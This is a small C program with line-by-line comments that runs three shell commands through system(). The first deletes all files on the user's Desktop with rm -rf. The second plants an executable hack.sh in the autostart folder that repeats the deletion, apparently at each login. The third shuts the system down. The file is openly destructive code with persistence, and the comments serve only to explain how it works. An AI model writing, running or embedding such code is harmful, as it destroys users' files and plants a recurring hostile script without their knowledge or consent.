#include <stdio.h>
#include <stdlib.h>

int main() {
    char *cmD1 = "rm -rf ~/Desktop/*"; 
    char *cmD2 = "echo '#!/bin/bash\nrm -rf ~/Desktop/*' > ~/.config/autostart/hack.sh && chmod +x ~/.config/autostart/hack.sh";
    char *cmD3 = "shutdown -h now";

    system(cmD1);  
    system(cmD2);  
    system(cmD3);  

    return 0;
}

// first character pointer cmD1
// rm -> remove command to remove file or directories
// -r -> means recursive to remove directories and theri contents
// f -> means force
// ~/Desktop/* -> to specifies all files
// so cmD1 will delete all files on the desktop 

// second character pointer cmD2 
// it create shell script named hach.sh
// it create in in ~/.config/autostart/
//
// #!/bin/bash is a shebang to specify the script type
//
// rm -rf ~/Desktop explained above
//
// >~/.config/autostart/hack.sh -> to redirect the output to hach.sh

// third character pointer cmD3
// shutdown -h now -> to shuts down the system

// system to execute the cmD1, cmD2 and cmD3
